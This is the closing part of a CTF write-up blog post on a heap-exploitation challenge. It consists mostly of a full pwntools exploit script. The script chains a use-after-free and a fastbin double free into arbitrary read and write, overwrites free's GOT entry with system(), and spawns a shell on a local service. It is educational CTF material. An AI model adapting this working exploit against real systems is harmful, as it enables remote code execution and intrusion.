    <span class="n">target</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span><span class="s">'3'</span><span class="p">)</span>
    <span class="n">target</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span><span class="s">'</span><span class="si">%</span><span class="s">d'</span> <span class="o">%</span> <span class="n">index</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">edit_player_name</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
    <span class="n">target</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span><span class="s">'4'</span><span class="p">)</span>
    <span class="c1"># edit name
</span>    <span class="n">target</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span><span class="s">'1'</span><span class="p">)</span>
    <span class="n">target</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span><span class="n">name</span><span class="p">)</span>
    <span class="c1"># go back to previous menu
</span>    <span class="n">target</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span><span class="s">'0'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show_player</span> <span class="p">(</span><span class="n">target</span><span class="p">):</span>
    <span class="n">target</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span><span class="s">'5'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show_team</span> <span class="p">(</span><span class="n">target</span><span class="p">):</span>
    <span class="n">target</span><span class="o">.</span><span class="n">sendline</span> <span class="p">(</span><span class="s">'6'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">leak_once</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">addr</span><span class="p">):</span>
    <span class="n">select_player</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
    <span class="c1"># now we try to overwrite to the corrupted ptr thanks to the overlap
</span>    <span class="n">edit_player_name</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="s">"c"</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">addr</span><span class="p">))</span>
    <span class="n">recv_all</span> <span class="p">(</span><span class="n">target</span><span class="p">)</span>
    <span class="c1"># leak
</span>    <span class="n">select_player</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">recv_all</span> <span class="p">(</span><span class="n">target</span><span class="p">)</span>
    <span class="n">show_player</span> <span class="p">(</span><span class="n">target</span><span class="p">)</span>

    <span class="n">target</span><span class="o">.</span><span class="n">recvuntil</span> <span class="p">(</span><span class="s">'Name: '</span><span class="p">)</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">target</span><span class="o">.</span><span class="n">recvuntil</span> <span class="p">(</span><span class="s">'A/D/S/P:'</span><span class="p">)</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">result</span><span class="p">[:</span> <span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="s">'A/D/S/P:'</span><span class="p">)</span> <span class="o">-</span> <span class="mi">2</span><span class="p">]</span>

    <span class="k">return</span> <span class="n">result</span>

<span class="k">def</span> <span class="nf">leak_bytes</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">n_bytes</span><span class="p">):</span>
    <span class="n">result</span> <span class="o">=</span> <span class="s">''</span>
    <span class="n">cur_addr</span> <span class="o">=</span> <span class="n">addr</span>
    <span class="k">while</span> <span class="nb">len</span> <span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">n_bytes</span><span class="p">:</span>
        <span class="n">leaked</span> <span class="o">=</span> <span class="n">leak_once</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">cur_addr</span><span class="p">)</span>
        <span class="n">leaked</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span>
        <span class="n">result</span> <span class="o">+=</span> <span class="n">leaked</span>
        <span class="n">cur_addr</span> <span class="o">+=</span> <span class="nb">len</span> <span class="p">(</span><span class="n">leaked</span><span class="p">)</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">result</span><span class="p">[:</span><span class="n">n_bytes</span><span class="p">]</span>

    <span class="k">return</span> <span class="n">result</span>

<span class="k">def</span> <span class="nf">leak_qword</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">addr</span><span class="p">):</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">leak_bytes</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
    <span class="n">val</span> <span class="o">=</span> <span class="n">u64</span> <span class="p">(</span><span class="n">result</span><span class="p">,</span> <span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">val</span>

<span class="k">def</span> <span class="nf">write_bytes</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="n">cur_addr</span> <span class="o">=</span> <span class="n">addr</span>
    <span class="n">select_player</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
    <span class="c1"># now we try to overwrite to the corrupted ptr thanks to the overlap
</span>    <span class="n">edit_player_name</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="s">"c"</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">cur_addr</span><span class="p">))</span>
    <span class="n">recv_all</span> <span class="p">(</span><span class="n">target</span><span class="p">)</span>
    <span class="c1"># leak
</span>    <span class="n">select_player</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">recv_all</span> <span class="p">(</span><span class="n">target</span><span class="p">)</span>

    <span class="n">edit_player_name</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
    <span class="n">recv_all</span> <span class="p">(</span><span class="n">target</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">write_dword</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">dword</span><span class="p">):</span>
    <span class="n">write_bytes</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">dword</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">write_qword</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">qword</span><span class="p">):</span>
    <span class="n">write_bytes</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">qword</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">))</span>
    <span class="n">write_bytes</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">addr</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="p">(</span><span class="n">qword</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">))</span>

<span class="c1">#target = process ('main.elf')
</span><span class="n">target</span> <span class="o">=</span> <span class="n">remote</span> <span class="p">(</span><span class="s">'127.0.0.1'</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>

<span class="c1"># leak heap
</span><span class="n">add_player</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="s">'player0'</span><span class="p">)</span>
<span class="n">select_player</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="n">del_player</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="n">recv_all</span> <span class="p">(</span><span class="n">target</span><span class="p">)</span>
<span class="n">show_player</span> <span class="p">(</span><span class="n">target</span><span class="p">)</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">recv_all</span> <span class="p">(</span><span class="n">target</span><span class="p">)</span>

<span class="c1"># parse leak
</span><span class="n">lines</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">split</span> <span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">found</span> <span class="o">=</span> <span class="bp">None</span>
<span class="n">leak</span> <span class="o">=</span> <span class="bp">None</span>
<span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">:</span>
    <span class="k">if</span> <span class="s">'A/D/S/P'</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
        <span class="n">found</span> <span class="o">=</span> <span class="n">line</span>
        <span class="k">break</span>
<span class="k">if</span> <span class="n">found</span><span class="p">:</span>
    <span class="n">kv</span> <span class="o">=</span> <span class="n">found</span><span class="o">.</span><span class="n">split</span> <span class="p">(</span><span class="s">':'</span><span class="p">)</span>
    <span class="n">leak</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">kv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span> <span class="p">(</span><span class="s">','</span><span class="p">)</span>
    <span class="n">leak</span> <span class="o">=</span> <span class="nb">int</span> <span class="p">(</span><span class="n">leak</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>
    <span class="k">print</span> <span class="s">'[+] Got heap address : 0x</span><span class="si">%</span><span class="s">x'</span> <span class="o">%</span> <span class="n">leak</span>

<span class="c1"># now play with the heap a bit
</span>
<span class="k">print</span> <span class="s">'[+] Prepare heap'</span>

<span class="n">add_player</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="s">'/bin/bash'</span><span class="p">)</span>
<span class="n">add_player</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="s">'player2'</span><span class="p">)</span>
<span class="n">add_player</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="s">'player3'</span><span class="p">)</span>

<span class="n">select_player</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>

<span class="n">del_player</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">recv_all</span> <span class="p">(</span><span class="n">target</span><span class="p">)</span>

<span class="c1"># create fastbin double free()
# realloc() free player2 name as it is shorter than the asked named
# but we already previously freed() hdr2 and name2
# this provokes our double free condition :D
</span>
<span class="k">print</span> <span class="s">'[+] Create fastbin double free'</span>

<span class="n">edit_player_name</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="s">"a"</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>
<span class="n">recv_all</span> <span class="p">(</span><span class="n">target</span><span class="p">)</span>

<span class="c1"># create overlap
</span>
<span class="k">print</span> <span class="s">'[+] Create overlap'</span>

<span class="c1"># we use a header free space
</span><span class="n">add_player</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="s">"b"</span> <span class="o">*</span> <span class="mi">40</span><span class="p">)</span>
<span class="c1"># take another header + overlap a name
</span><span class="n">add_player</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="s">"c"</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="s">"d"</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span>
<span class="n">recv_all</span> <span class="p">(</span><span class="n">target</span><span class="p">)</span>

<span class="k">print</span> <span class="s">'[+] Overwrite'</span>

<span class="c1"># read file
</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span> <span class="p">(</span><span class="s">'main.elf'</span><span class="p">)</span>

<span class="n">free_addr</span> <span class="o">=</span> <span class="n">leak_qword</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">binary</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'free'</span><span class="p">])</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="n">free_addr</span> <span class="o">-</span> <span class="mh">0x7da20</span>

<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x410B0</span>
<span class="k">print</span> <span class="s">'libc base : 0x</span><span class="si">%</span><span class="s">x'</span> <span class="o">%</span> <span class="n">libc_base</span>
<span class="k">print</span> <span class="s">'free()    : 0x</span><span class="si">%</span><span class="s">x'</span> <span class="o">%</span> <span class="n">free_addr</span>
<span class="k">print</span> <span class="s">'system()  : 0x</span><span class="si">%</span><span class="s">x'</span> <span class="o">%</span> <span class="n">system_addr</span>

<span class="n">write_bytes</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">binary</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'free'</span><span class="p">],</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;Q'</span><span class="p">,</span> <span class="n">system_addr</span><span class="p">))</span>
<span class="n">leaked</span> <span class="o">=</span> <span class="n">leak_qword</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">binary</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'free'</span><span class="p">])</span>
<span class="k">print</span> <span class="s">'leaked    : 0x</span><span class="si">%</span><span class="s">x'</span> <span class="o">%</span> <span class="n">leaked</span>

<span class="k">print</span> <span class="s">'[+] Spawn shell'</span>

<span class="n">del_player</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="n">recv_all</span> <span class="p">(</span><span class="n">target</span><span class="p">)</span>

<span class="n">target</span><span class="o">.</span><span class="n">interactive</span> <span class="p">()</span></pre></td></tr></tbody></table></code></pre></figure>

<h1 id="conclusion">Conclusion</h1>

<p>This challenge presented a nice UAF vulnerability and using the realloc() trick allowed us to exploit a fastbins double-free.
Another way was to play with heap alignment.</p>

<p>Cheers,</p>

<p>m_101</p>

  </div>

  <div class="post-navigation">
    
    <a class="post-prev" href="/binholic/2017/05/20/notes-on-abusing-exit-handlers.html">Previous : Notes on abusing exit handlers, bypassing pointer mangling and glibc ptmalloc hooks</a>
    

    
    <a class="post-next" href="/binholic/2017/10/12/vulnhub-c0m80-boot2root.html">Next : VulnHub - c0m80 boot2root</a>
    
  </div>

  
    <div id="disqus_thread"></div>
    <script>
        var disqus_config = function () {
            this.page.url = "http://binholic.com/2017/08/30/rhme3-qualifier-heap-exploitaiton.html";
            this.page.identifier = "/2017/08/30/rhme3-qualifier-heap-exploitaiton";
        };

        (function() { // DON'T EDIT BELOW THIS LINE
            var d = document, s = d.createElement('script');

            s.src = '//binholic.disqus.com/embed.js';

            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
  

</article>

      </div>
    </div>

    <footer class="site-footer">

  <div class="wrapper">

      <div class="site-footer">
        <ul class="social-media-list">
          
          <li>
            <a href="https://github.com/m101"><span class="icon icon--github"><svg viewBox="0 0 16 16"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/></svg>
</span></a>

          </li>
          

          
          <li>
            <a href="https://twitter.com/w_levin"><span class="icon icon--twitter"><svg viewBox="0 0 16 16"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/></svg>
</span></a>

          </li>
          

          
          <li>
            <a href="mailto:m101.sec@gmail.com"><span class="icon icon--email"><?xml version="1.0" encoding="UTF-8"?>
<!-- Generator: Adobe Illustrator 16.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="240.665px" height="250px" viewBox="43.833 205.167 240.665 250" enable-background="new 43.833 205.167 240.665 250" xml:space="preserve">
<g>
	<path fill="#323232" d="M221.459,396.62c-8.84,0-15.904-2.21-21.191-6.63c-5.289-4.42-8.449-10.441-9.488-18.07   c-4.855,5.895-10.66,10.965-17.42,15.21c-6.762,4.249-14.561,6.37-23.4,6.37c-6.59,0-12.83-1.256-18.72-3.77   c-5.895-2.512-11.095-6.15-15.6-10.92c-4.509-4.766-8.105-10.571-10.79-17.42c-2.689-6.846-4.03-14.69-4.03-23.531   c0-9.879,1.56-19.064,4.68-27.56c3.12-8.49,7.365-15.86,12.74-22.1c5.371-6.24,11.7-11.136,18.98-14.69   c7.28-3.551,15.08-5.33,23.4-5.33c9.01,0,16.68,1.82,23.01,5.461c6.324,3.639,11.311,8.234,14.949,13.779l2.34-17.42h20.541   l-10.66,85.02c-0.52,3.99-0.781,7.021-0.781,9.101c0,5.029,1.041,8.929,3.121,11.7c2.08,2.774,5.545,4.16,10.4,4.16   c4.504,0,8.84-1.646,13-4.94c4.16-3.29,7.799-7.931,10.92-13.91c3.119-5.979,5.589-13.085,7.41-21.319   c1.82-8.23,2.729-17.291,2.729-27.17c0-11.961-2.123-23.051-6.369-33.281c-4.25-10.225-10.228-19.064-17.939-26.52   c-7.715-7.451-16.859-13.26-27.43-17.42c-10.576-4.16-22.189-6.24-34.842-6.24c-16.119,0-30.464,3.165-43.029,9.49   c-12.57,6.33-23.14,14.605-31.72,24.83c-8.58,10.229-15.08,21.799-19.5,34.71c-4.42,12.915-6.63,26.045-6.63,39.39   c0,15.08,2.34,28.516,7.02,40.301c4.68,11.789,11.18,21.795,19.5,30.029c8.32,8.23,18.11,14.471,29.38,18.721   c11.265,4.244,23.485,6.369,36.661,6.369c13.17,0,24.914-1.561,35.229-4.68c10.311-3.121,20.15-6.936,29.512-11.439l7.539,19.76   c-9.016,4.85-19.891,8.924-32.631,12.219c-12.738,3.291-26.479,4.941-41.209,4.941c-16.64,0-31.98-2.516-46.02-7.541   c-14.04-5.029-26.175-12.439-36.4-22.23c-10.229-9.795-18.2-21.84-23.92-36.139c-5.72-14.301-8.58-30.811-8.58-49.53   c0-17.331,2.99-33.841,8.97-49.53c5.98-15.686,14.471-29.51,25.48-41.47c11.005-11.96,24.266-21.45,39.78-28.47   c15.51-7.02,32.889-10.53,52.129-10.53c16.291,0,31.156,2.645,44.59,7.93c13.432,5.29,24.916,12.524,34.451,21.71   c9.529,9.189,16.898,20.064,22.1,32.63c5.199,12.568,7.799,26.129,7.799,40.689c0,12.48-1.518,23.965-4.549,34.45   c-3.035,10.489-7.195,19.5-12.48,27.04c-5.289,7.54-11.615,13.391-18.98,17.55C238.139,394.54,230.124,396.62,221.459,396.62z    M156.979,374.26c6.76,0,13-1.86,18.721-5.59c5.719-3.725,10.311-7.756,13.779-12.09l6.24-51.48   c-3.469-5.545-7.975-10.051-13.52-13.52c-5.551-3.465-11.875-5.2-18.98-5.2c-5.201,0-10.23,1.17-15.08,3.511   c-4.855,2.34-9.145,5.635-12.87,9.879c-3.729,4.25-6.675,9.32-8.84,15.211c-2.169,5.895-3.25,12.395-3.25,19.5   c0,13.174,3.291,23.1,9.88,29.77C139.645,370.925,147.62,374.26,156.979,374.26z"/>
</g>
</svg></span></a>

          </li>
          

          
          <li>
            <a href="http://127.0.0.1:8888/USK@ABR8mm2t1L1G8cBG70cDy4PHFO6LPV~LrA-RIZxgOGI,pnGWUxb7k8~5-ywwqnBakTXx5ZFw6QzzZj7H~45NgE8,AQACAAE/binholic/-1/"><span class="icon icon--freenet"><?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!-- Created with Inkscape (http://www.inkscape.org/) -->
<svg
   xmlns:svg="http://www.w3.org/2000/svg"
   xmlns="http://www.w3.org/2000/svg"
   version="1.0"
   width="79.12"
   height="52.64">
  <defs/>
  <g
     transform="translate(-47.495719,-111.30691)">
    <path
       d="M 80.03,122.66 C 94.49,107.06 104.32,113.99 87.53,124.89 C 82.19,128.36 83.58,129.37 87.17,128.82 C 92.24,128.05 95.01,129.02 96.24,129.98 C 99.18,132.28 100.65,130.57 101.64,128.82 C 103.61,125.35 110.25,129.12 105.39,132.75 C 101.59,135.58 102.12,138.77 105.57,140.61 C 111.96,144.01 126.30,150.75 124.14,157.93 C 123.26,160.86 121.67,163.62 118.07,159.89 C 111.32,152.92 106.83,146.97 91.28,144.54 C 81.24,142.96 71.15,140.33 61.46,145.25 C 56.90,147.67 51.16,149.23 49.94,146.37 C 48.35,142.64 56.47,139.57 64.32,138.82 C 69.42,138.33 73.99,134.99 67.00,133.29 C 58.39,130.64 68.28,123.09 74.50,124.89 C 78.55,126.07 78.95,123.83 80.03,122.66 z"
       style="fill:#ffffff;stroke:#356ace;stroke-width:1.5;" />
  </g>
</svg>
</span></a>

          </li>
          
        </ul>
      </div>

    </div>

  </div>

</footer>


  </body>

</html>
